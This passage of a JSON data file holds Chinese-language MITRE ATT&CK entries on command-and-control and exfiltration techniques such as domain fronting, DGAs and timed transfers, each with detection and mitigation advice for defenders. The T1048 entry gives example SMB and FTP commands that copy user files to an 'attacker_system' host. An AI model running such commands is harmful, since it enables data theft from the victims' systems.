		"detection": "<p>分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多，或者一个客户端给另外一个不应该或经常不相互通信的客户端发送了数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "数据混淆"
}, {
	"id": "T1172",
	"description": "<p>域名前置技术利用内容交付网络（CDN）及其他拥有多个域的服务的路由方案来混淆HTTPS流量或通过HTTPS通道传输的流量的预期目的地。该技术涉及在TLS头的SNI字段和HTTP头的Host字段中使用不同的域名。如果两个域来自同一个CDN，则CDN可以在解开TLS头后路由到HTTP头中指定的地址。该技术的变体，“无域名”前置，将SNI字段留空。即使CDN尝试来验证SNI和HTTP Host字段匹配（如果忽略了留空的SNI字段），数据仍可最终到达目的地。</p><p>例如，如果域-x和域-y属于同一个CDN，则可以将域-x放在TLS头中，将域-y放在HTTP头中。数据看起来将流向域-x，但是CDN可能会将其路由到域-y。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["SSL/TLS检查", "网络抓包"]
	},
	"relations": {
		"detection": "<p>如果SSL检查已就绪或数据未加密，则可以检查HTTP头的Host字段是否与HTTPS SNI匹配或检查其是否与域名黑名单或白名单对应。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "为了使用域名前置技术，攻击者可能需要部署一些额外的工具到入侵的系统。可使用应用白名单来防止攻击者安装这些工具。"
		}, {
			"name": "SSL/TLS检查",
			"description": "如果可以检查HTTPS流量，则可以分析抓包内容来查看是否有域名前置技术相关的连接。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "域名前置"
}, {
	"id": "T1483",
	"description": "<p>攻击者可能会利用域名生成算法（DGA）来动态识别C&amp;C流量的目的地，而不是依赖于静态IP地址或域的列表。这样做的好处是，防御程序很难阻止、跟踪或接管命令与控制通道，因为恶意软件可能会检查成千上万个域以等待指示。</p><p>DGA算法通过生成每个字母来构造域名时，可能会采用看似随机或“莫名其妙的”字符串（例如：istgmxdejdnxuyla.ru）。或者，某些DGA算法使用完整的单词作为单位，将单词（而不是字母）连接在一起（例如：cityjulydish.net）。许多DGA算法基于时间，在每个时间段（每小时，每天，每月等）生成一个不同的域名。另一些则还包含种子值，使得防御程序更难预测未来的域名。</p><p>攻击者可能出于失败回退渠道的目的而使用DGA算法。当失去与主要C&amp;C服务器的联系时，恶意软件可能会使用DGA算法来重新建立命令与控制。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["网络进程使用", "网络抓包", "网络设备日志", "Netflow/Enclave技术网络流分析", "DNS记录"]
	},
	"relations": {
		"detection": "<p>检测动态生成的域是一项挑战，因为有各式各样的DGA算法，恶意软件家族在不断发展而且算法复杂性也在提高。有多种方法可检测伪随机生成的域名，包括使用频率分析，马尔可夫链，熵，字典单词比例，元音与其他字符的比例等。CDN域可能会由于其域名格式而触发这些检测。除了基于名称检测DGA域外，另一种用于检测可疑域的更通用方法是检查最近注册的名称或访问很少的域。</p><p>已经开发了用于检测DGA域的机器学习方法，并在应用程序中取得了成功。其中一种是使用N-Gram方法来确定域名中字符串的随机性得分。如果随机分数很高而且该域没有列入白名单（CDN等），则可以确定域是否与合法主机或DGA相关。另一种是使用深度学习方法将域归类为DGA生成的域。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。恶意软件研究人员可以对使用DGA算法的恶意软件变体进行反向工程，并确定该恶意软件将来会试图联系的域，但这是一项耗费时间和资源的工作。恶意软件也越来越多地加入种子值（这些种子值对于每个实例都是唯一的），然后需要确定这些种子值以提取将来会生成的域。某些情况下，可以从DNS流量中提取特定样本使用的种子。即便如此，每天仍可能产生数千个域。因此，防御程序由于成本而抢先注册所有可能的C&C域是不切实际的。"
		}, {
			"name": "Web内容限制",
			"description": "某些情况下，可以使用本地DNS沉洞来帮助以较低的成本防止基于DGA的命令与控制。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "域名生成算法"
}, {
	"id": "T1008",
	"description": "<p>如果主要渠道遭到破坏或无法访问，则攻击者可能会使用回退或备用通信渠道来维持可靠的命令与控制并避免数据传输阈值。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["恶意软件反向工程", "Netflow/Enclave技术网络流分析", "网络抓包", "进程监控", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "失败回退通道"
}, {
	"id": "T1188",
	"description": "<p>为了掩盖恶意流量的来源，攻击者可能会将多个代理链接在一起。通常，防御程序能够识别最后一个穿过它进入其网络的代理通信流量；防御程序可能能够或无法识别最后一跳代理之前的任何其它代理。这种技术要求防御程序跟踪多个代理上的恶意流量来识别其来源，使得识别恶意流量的来源更加困难。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络协议分析", "Netflow/Enclave技术网络流分析"]
	},
	"relations": {
		"detection": "<p>观察多跳代理的使用时，可找出来自实际C&amp;C服务器的网络数据与入流和出流之间的关系从而追溯到恶意流量的来源。也可以通过检查向使用此技术的已知匿名网络（如Tor）或已知攻击者基础设施发送的流量警报来检测多跳代理。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "可使用网络黑名单和白名单来阻止流量进入已知匿名网络和C&C基础设施。值得注意的是，有些技术如域名前置可能能够规避此措施。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "多跳代理"
}, {
	"id": "T1104",
	"description": "<p>攻击者可能会为不同条件下采用的命令与控制或是为实现某些功能而划分多个阶段。多阶段的使用可能会混淆命令与控制通道，使检测更加困难。</p><p>远程访问工具将回调第一阶段命令与控制服务器以获取指令。第一阶段可能有自动化功能，可收集基本主机信息，更新工具以及上传其他文件。此时可以上传第二个远程访问工具（RAT），从而将主机重定向到第二阶段命令与控制服务器。第二阶段可能具有更全面的功能，并允许对手通过反向shell和其他RAT功能与系统进行交互。</p><p>不同的阶段可能会单独托管，没有重叠的基础设施。如果第一阶段原始的通信路径被发现和阻止，加载程序还可能会有备用的第一级回调或回退信道。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["Netflow/Enclave技术网络流分析", "网络设备日志", "网络协议分析", "网络抓包", "进程使用网络"]
	},
	"relations": {
		"detection": "<p>可通过网络连接与未知或可疑进程相关联的主机数据非常重要，它们可用于基于恶意软件命令和控制签名及基础设施来补充现有的入侵指标。将系统和网络信息发现或横向移动可能导致的后续操作与原始进程相关联也可以产生有用数据。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "多段信道"
}, {
	"id": "T1026",
	"description": "<p>某些攻击者可能会分开不同协议之间的通信。一个用于入站命令与控制的协议，另一个用于出站数据，从而绕过某些防火墙限制。拆分也可以是随机的，以简单地避免任何一个通信上的数据阈值警报。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "进程使用网络", "恶意代码逆向工程", "进程监控"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。关联多个通信通道之间的警报可以进一步帮助识别命令与控制行为。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定C&C协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "多频段通信"
}, {
	"id": "T1079",
	"description": "<p>攻击者使用多层加密执行C2通信，通常（但不是唯一地）在协议加密方案（例如HTTPS或SMTPS）内通过隧道传输自定义加密方案。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "进程使用网络", "恶意代码逆向工程", "进程监控"]
	},
	"relations": {
		"detection": "<p>如果恶意软件使用标准加密协议，则可以使用SSL/TLS检查来检测某些加密通信信道中的命令与控制流量。SSL/TLS检查的确带有某些风险。在实施之前应该考虑这些风险，以避免潜在的安全问题，例如不完整的证书验证。SSL/TLS检查之后，可能还另外需要分析第二层加密。</p><p>如果恶意软件使用带对称密钥的自定义加密协议，则有可能从样本中获取算法和密钥来解码网络流量从而检测恶意软件的通信签名。</p><p>通常，分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。由于流量前面能力降低，使用加密协议可能会使得基于网络的C2检测更加困难。事先了解攻击者的C2基础结构可能有益于阻止域和IP地址，但由于攻击者经常更改基础结构，因此可能不是有效且长期的解决方案。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "多层加密"
}, {
	"id": "T1219",
	"description": "<p>攻击者可能会使用合法的桌面支持和远程访问软件，例如Team Viewer，Go2Assist，LogMein，AmmyyAdmin等，来建立通向网络内目标系统的交互式命令与控制通道。这些服务通常用作合法的技术支持软件，并且可能在目标环境中列入白名单。与攻击者常用的其他合法软件相比，VNC，Ammy和Teamviewer等远程访问工具被频繁使用。</p><p>攻击者可能会在入侵后确立远程访问工具并将其作为冗余访问的备用通信信道，或者作为与目标系统建立交互式远程桌面会话的方式。它们还可以用作恶意软件的组件，以建立反向连接到服务或攻击者控制的系统。</p><p>TeamViewer等管理工具已被多个团体用于针对俄罗斯国家和犯罪活动所感兴趣国家的机构。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["网络入侵检测系统", "网络协议分析", "进程使用网络", "网络监控"]
	},
	"relations": {
		"detection": "<p>监控与远程管理工具相关的应用程序和流程。如果合法用户和管理员使用这些工具，则将活动与其他可疑行为相关联以减少误报。</p><p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p><p>攻击者可能会结合使用“域前置”技术来逃避防御。他们可能需要将这些远程工具部署和/或安装到受感染的系统。可以使用基于主机的解决方案来检测或阻止这些工具的安装。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "使用应用程序白名单来减轻由于安装和使用未批准软件（用于远程访问）而造成的影响。"
		}, {
			"name": "过滤网络流量",
			"description": "正确配置防火墙，应用程序防火墙和代理，以限制远程访问工具所使用站点和服务的传出流量。"
		}, {
			"name": "网络入侵防御",
			"description": "使用网络签名的网络入侵检测和防御系统可能能够阻止到远程访问服务的流量。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "远程访问工具"
}, {
	"id": "T1071",
	"description": "<p>攻击者可能会基于常见的标准化应用程序层协议（例如HTTP，HTTPS，SMTP或DNS）进行通信，将他们的通信数据与现有通信数据混合，从而规避检测。远程系统的命令（通常是这些命令的结果）将嵌入到客户端和服务器之间的协议数据中。</p><p>飞地内连接（例如，代理或枢纽节点与其他节点之间的连接）的常用协议为RPC，SSH或RDP。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "网络进程使用", "恶意软件反向工程", "进程监控"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "标准应用层协议"
}, {
	"id": "T1032",
	"description": "<p>攻击者可能会明确采用已知的加密算法来隐藏命令与控制流量，而不是依赖于通信协议自己提供的任何保护。尽管使用了安全算法，但是如果在恶意软件样本/配置文件中对必要的秘密密钥进行了编码和/或生成，则这些实现可能容易受到逆向工程的影响。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "恶意软件反向工程", "网络进程使用", "进程监控", "SSL/TLS检查"]
	},
	"relations": {
		"detection": "<p>SSL/TLS检查是在某些加密通信通道中检测命令与控制流量的一种方法。SSL/TLS检查的确带有某些风险。在实施之前应考虑这些风险，以避免潜在的安全问题，例如不完整的证书验证。</p><p>如果恶意软件使用对称密钥加密，则有可能从样本中获取算法和密钥来解码网络流量从而检测恶意软件的通信签名。</p><p>总之，分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}, {
			"name": "SSL/TLS检查",
			"description": "可通过SSL/TLS检查来查看加密会话的内容，从而查找恶意软件通信协议的网络指示信息。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "标准加密协议"
}, {
	"id": "T1095",
	"description": "<p>使用标准的非应用层协议进行主机与C2服务器之间或网络中受感染主机之间的通信。可能的协议列表很广泛。具体示例包括使用网络层协议，如Internet控制消息协议（ICMP）；传输层协议，如用户数据报协议（UDP）；会话层协议，如Socket Secure（SOCKS）；以及重定向/隧道协议，如Serial over LAN（SOL）。</p><p>主机之间的ICMP通信就是一个例子。由于ICMP是Internet协议套件的一部分，因此需要由所有IP兼容主机实施；但是，它不像其他因特网协议（如TCP或UDP）那样受到监控，并且可能被攻击者用来隐藏通信。</p>",
	"details": {
		"platform": ["Windows", "Linux", "macOS"],
		"dataSources": ["主机网络接口", "Netflow/Enclave技术网络流分析", "网络入侵检测系统", "网络协议分析", "网络抓包", "进程网络访问"]
	},
	"relations": {
		"detection": "<p>分析网络流量来查看是否有ICMP消息或包含异常数据的其他协议的网络流量，或者通常在网络内部或网络中看不到的网络流量。</p><p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p><p>监控和调查与启用和/或利用备用通信通道相关的API函数调用。</p>",
		"mitigations": [{
			"name": "过滤网络流量",
			"description": "过滤网络流量以防止跨越网络边界使用不必要的协议。"
		}, {
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}, {
			"name": "网络分段",
			"description": "正确配置防火墙和代理，以限制仅通过必要端口和适当的网络网关系统传出流量。此外，确保配置主机仅通过授权接口进行通信。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "标准非应用层协议"
}, {
	"id": "T1065",
	"description": "<p>攻击者可能会通过非标准端口进行C&amp;C通信，从而绕过配置不当的代理和防火墙。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["Netflow/Enclave技术网络流分析", "网络进程使用", "进程监控"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}, {
			"name": "网络分区",
			"description": "正确配置防火墙和代理，限定外发流量给特定网段上必需的端口。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "不常用的端口"
}, {
	"id": "T1020",
	"description": "<p>在收集过程中收集的数据（如敏感文档）可能会通过自动化处理或脚本渗漏出去。</p><p>自动化渗漏技术可与其他渗漏技术，例如经由C&amp;C的数据渗漏和备用协议上的数据渗漏，结合起来将信息传输到网络之外。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>监控进程文件访问模式和网络行为。如果有无法识别的进程或脚本似乎正在遍历文件系统并发送网络流量，则是可疑的。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "自动化数据渗漏"
}, {
	"id": "T1002",
	"description": "<p>攻击者可能会压缩数据渗漏之前收集的数据（例如，敏感文档）来使得数据更加轻便，并将通过网络发送的数据量降至最低。压缩和渗漏通道是分开的。数据是使用自定义程序/算法或通用压缩库/实用程序（如7zip、RAR、ZIP或zlib）来压缩的。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["二进制文件元数据", "文件监控", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>可通过多种方式来检测压缩软件和压缩文件。监控进程和已知压缩实用程序的命令行参数来检测系统中可能存在的或由攻击者引入的通用实用程序。这可能会产生大量良性事件，具体取决于环境中系统的典型使用方式。</p><p>如果通信通道未加密，则可以通过网络入侵检测或使用数据丢失防御系统来分析文件头，从而检测数据渗漏过程中正在传输的压缩文件。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "可以将网络入侵防御或数据丢失防御工具设置为阻止特定文件类型通过未加密的通道离开网络。在这些情况下，攻击者可能会移向加密通道或使用其他流量封装机制。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "数据压缩"
}, {
	"id": "T1022",
	"description": "<p>渗漏之前先加密数据是为了躲避检测，或使得数据渗漏在防御程序检查时不那么明显。加密是由实用程序、编程库或自定义算法对数据本身执行的。这种加密与由C&amp;C或文件传输协议执行的加密是分开的。常见可加密的压缩格式包括RAR和zip。</p><p>数据加密技术可与其他渗漏技术，例如经由C&amp;C的数据渗漏和备用协议上的数据渗漏，结合起来将信息传输到网络之外。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>可以通过多种方式检测加密软件和加密文件。监控进程和已知加密实用程序的命令行参数来检测系统中可能存在的或由攻击者引入的通用实用程序。这可能会产生大量良性事件，具体取决于环境中系统的典型使用方式。通常，加密密钥在软件命令行调用中声明。</p><p>加载Windows动态链接库crypt32.dll的进程可用于执行加密、解密或文件签名验证。</p><p>还可以对网络流量进行熵分析来确定是否正在传输加密数据。如果通信通道未加密，则可以通过网络入侵检测或使用数据丢失防御系统来分析文件头，从而检测数据渗漏过程中正在传输的加密文件。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "数据加密"
}, {
	"id": "T1030",
	"description": "<p>攻击者可能会泄露固定大小块的数据而不是整个文件数据，或者将数据包大小限制在特定阈值以下。该方法可用于避免触发网络数据传输阈值警报。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "进程使用网络", "进程监控"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果进程维持长连接，在此期间它始终发送固定大小的数据包，或者进程打开连接并定期发送固定大小的数据包，则可能正在执行聚合数据传输。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者C&C基础架构及恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "数据传输大小限制"
}, {
	"id": "T1048",
	"description": "<p>数据渗漏是通过与主C&amp;C协议或通道不同的协议执行的。数据可能会从主C&amp;C服务器发送到备用网络位置。备用协议包括FTP，SMTP，HTTP/S，DNS，SMB或任何其他不用作主要命令和控制通道的网络协议。通道可能包括Internet web服务，例如云存储。</p><p>攻击者可能会利用各种操作系统实用程序通过备用协议进行数据渗漏。</p><p>SMB命令行示例：</p><p>·         <code>net use \\\\attacker_system\\IPC$ /user:usernamepassword &amp;&amp; xcopy /S /H /C /Y C:\\Users\\*\\\\attacker_system\\share_folder\\</code></p><p>匿名FTP命令行示例：</p><p>·         <code>echo PUT C:\\Path\\to\\file.txt | ftp -Aattacker_system</code></p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["用户接口", "进程监控", "网络进程使用", "网络抓包", "Netflow/Enclave技术网络流分析", "网络协议分析"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "强制代理并为DNS等服务使用专用服务器，并且只允许这些系统通过各自的端口/协议进行通信，而不是通过网络中的所有系统进行通信。"
		}, {
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者C&C基础软件及恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。"
		}, {
			"name": "网络分区",
			"description": "请遵循网络防火墙配置的最佳实践，仅允许必要的端口和流量进入和退出网络。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "备用协议上的数据渗漏"
}, {
	"id": "T1041",
	"description": "<p>数据渗漏是通过C&amp;C通道执行的。使用与C&amp;C通信相同的协议将数据编码到正常通信通道中。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["用户接口", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控C&amp;C。分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定混淆技术，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "C&C通道的数据渗漏"
}, {
	"id": "T1011",
	"description": "<p>数据渗漏可能发生在与C&amp;C通道不同的网络介质上。如果C&amp;C网络是有线Internet连接，则可能会在WiFi连接，调制解调器，蜂窝数据连接，蓝牙，或其它射频（RF）通道发生数据渗漏。如果攻击者有足够的访问权限或足够近，他们可以选择这样做。而且，连接及主要的Internet连接通道可能不安全，因为数据不是在同一企业网络上路由的。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["用户接口", "进程监控"]
	},
	"relations": {
		"detection": "<p>如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。通常需要用户驱动的事件（例如，单击鼠标或按键）来访问网络的进程现在在不使用此类事件的情况下访问网络，则可能是恶意行为。</p><p>监控并调查对主机适配器设置的更改，例如添加和/或复制通信接口。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "尽可能避免创建新的网络适配器。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "非C&C通道的数据渗漏"
}, {
	"id": "T1052",
	"description": "<p>某些情况下，例如当网闸隔离的网络遭受攻击时，数据渗漏可能会在用户引入的物理介质或设备上发生。这样的介质可以是外接硬盘，U盘，蜂窝电话，MP3播放器或其他可移动存储和处理设备。物理介质或设备可以用作最终渗漏点，也可以用于在其他断连系统之间跳转。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["数据丢失防御", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控可移动媒体上的文件访问。检测装入可移动媒体时执行的进程。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "如果不需要，请禁用自动运行功能。如果业务操作不需要可移动介质，则在组织策略级别上禁止或限制它们。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "物理介质上的数据渗漏"
}, {
	"id": "T1029",
	"description": "<p>只能在一天中的特定时间或特定时间间隔执行数据渗漏攻击。这样做可以将流量模式与正常活动或可用性混合在一起。</p><p>攻击者执行定时数据渗漏攻击时，可同时使用其他渗漏技术，例如经由C&amp;C的数据渗漏和备用协议上的数据渗漏，来将信息传输到网络之外。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["Netflow/Enclave技术网络流分析", "网络进程使用", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控进程文件访问模式和网络行为。如果有无法识别的进程或脚本似乎正在遍历文件系统并发送网络流量，则是可疑的。如果连续数天的同一时间都有指向同一个目的地的网络连接，则是可疑的。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者C&C基础设施及恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定混淆技术，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "定时传输"
}, {
	"id": "T1537",
	"description": "<p>攻击者可能会将数据（包括云环境里的备份数据）传输到同一服务上他们所控制的其他云账户来窃取数据，而不是通过典型的文件传输/下载方式来窃取数据，这样可以避开基于网络的数据渗漏检测。</p><p>用于监控通过正常的文件传输方式或通过命令和控制通道方式将大量数据对外传输的防御程序可能并不会监控向同一云提供商内部另外一个账户的数据传输。这样的传输方式可能会利用现有的云提供商API以及云提供商的内部地址空间来混入正常的流量中，或者避免通过外部网络接口进行数据传输。</p><p>已经观察到有攻击者创建云实例备份并将备份数据传输到单独账户。</p>",
	"details": {
		"platform": ["Azure", "AWS", "GCP"],
		"permissionRequired": ["用户"],
		"dataSources": ["Stackdriver日志", "Azure活动日志", "AWS CloudTrail日志"]
	},
	"relations": {
		"detection": "<p>监控账户活动来查看是否有使用同一云服务提供商的不受信任或异常账户来共享数据、快照或备份的尝试。监控账户之间以及到不受信任VPC的异常文件传输活动。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "实施基于网络的过滤限制，禁止将数据传输到不受信任的VPC。"
		}, {
			"name": "密码策略",
			"description": "请考虑在一定天数内轮换访问密钥，降低被盗凭据的有效性。"
		}, {
			"name": "用户账户管理",
			"description": "限制用户账户和IAM策略使用所需的最小权限。请考虑对仅在特定时间段有效的账户使用临时凭证，降低被盗账户的有效性。"
		}],
		"tactics": ["TA0010"]
	},
	"name": "将数据传输到云账户"
}, {
	"id": "T1531",
	"description": "<p>攻击者可能会禁止访问合法用户使用的账户，从而中断系统和网络资源的可用性。他们可以删除、锁定或操纵（例如：更改凭据）账户来移除对账户的访问。</p><p>攻击者随后还可能通过注销和/或重启来将恶意更改生效。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "root", "系统"],
		"dataSources": ["Windows event logs", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控与删除账户或更改密码有关的二进制文件的执行以及命令行参数，例如，使用Net。Windows事件日志可能记录了与攻击者试图移除账户访问相关的事件。</p><p>·         事件4723 – 试图更改账户密码。</p><p>·         事件4724 – 试图重置账户密码。</p><p>·         事件4726 – 用户账户已删除。</p><p>·         事件4740 – 用户账户已锁定。</p><p>针对Net的警报以及上述事件可能会有很高的误报率。因此，请与描述系统通常如何使用的基线知识相比较，并在可能的情况下将修改事件与其他恶意活动相关联来查看是否确实有恶意活动。</p>",
		"mitigations": [{
